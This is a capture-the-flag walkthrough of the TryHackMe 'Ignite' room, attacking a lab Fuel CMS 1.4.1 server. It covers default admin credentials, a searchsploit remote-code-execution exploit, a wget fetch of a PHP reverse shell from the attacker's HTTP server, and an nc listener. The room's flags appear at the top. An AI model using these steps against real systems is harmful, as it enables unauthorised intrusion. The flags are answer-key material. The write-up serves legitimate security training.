
link: [https://tryhackme.com/room/ignite](https://tryhackme.com/room/ignite)

# Task 1: Root It

User.txt
>6470e394cbf6dab6a91682cc8585059b

Root.txt
>b9bbcb33e11b80be759c4e844862482d


## Enumeration

Firstly, run a nmap scan and found port 80 is open.
```bash
└─$ nmap -sV -sC 10.10.201.62 

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
```

Navigate to http://10.10.201.62 inside the browser.
![[Writeups/TryHackMe/assets/img/THM-Writeups/Ignite/fuel-cms-1.png]]
![[Writeups/TryHackMe/assets/img/THM-Writeups/Ignite/fuel-cms-2.png]]
![[Writeups/TryHackMe/assets/img/THM-Writeups/Ignite/fuel-cms-3.png]]
![[Writeups/TryHackMe/assets/img/THM-Writeups/Ignite/fuel-cms-4.png]]

From above there's a link provided an admin panel link http://10.10.201.62/panel with username and password provided.
- Username: `admin`
- Password: `admin`
But looks like nothing special here.
![[Writeups/TryHackMe/assets/img/THM-Writeups/Ignite/fuel-dashboard.png]]


Run gobuster for directory scanning and there's nothing special too.
```bash
└─$ gobuster dir -u http://10.10.201.62/ -w /usr/share/wordlists/dirb/common.txt       
```
![[Writeups/TryHackMe/assets/img/THM-Writeups/Ignite/gobuster.png]]

Use searchsploit to search for vulnerability that running on Fuel CMS version 1.4
- Based on the result there's 3 exploit existed 
```bash
└─$ searchsploit fuel cms 1.4
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                                                                                | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                                                                                | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                                                                                                | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                                                                                                                               | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                                                                                      | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                                                                                          | php/webapps/48778.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

![[Writeups/TryHackMe/assets/img/THM-Writeups/Ignite/searchsploit.png]]

Download the exploit python script
```bash
└─$ searchsploit -m 50477
```

Run the `50477.py` script with url and we able to gained access to it.
![[Writeups/TryHackMe/assets/img/THM-Writeups/Ignite/run-exploit.png]]

Try to cat for `fuel/application/config/database.php` and we'll found the password for root user.
![[Writeups/TryHackMe/assets/img/THM-Writeups/Ignite/database.php.png]]

Try to search for user flag。
![[Writeups/TryHackMe/assets/img/THM-Writeups/Ignite/user-flag.png]]

## Privileges Escalation

We need a way to get a shell in the system, “sudo -l” doesn’t return anything to us. What we can do is to upload a reverse shell onto the `www-data`
```bash
# locate webshell file
└─$ locate shell.php

# copy it to current directory
└─$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php

# edit the reverse shell by changing the ip address of kali machine and local port
└─$ nano shell.php 

# create a http server for target machine to download the shell.php file
└─$ python3 -m http.server 80   
```

Back to target machine terminal and download the `shell.php` file.
```bash
wget http://10.2.20.52:80/shell.php
```

Start a netcat listener on local machine to catch the shell once the `shell.php` is executed on the target machine.
```bash
└─$ nc -nvlp 1234
```

Navigate to the http://10.10.201.62/shell.php to execute the `shell.php` and we should now able to get an reverse shell on netcat listener
![[Writeups/TryHackMe/assets/img/THM-Writeups/Ignite/root-access.png]]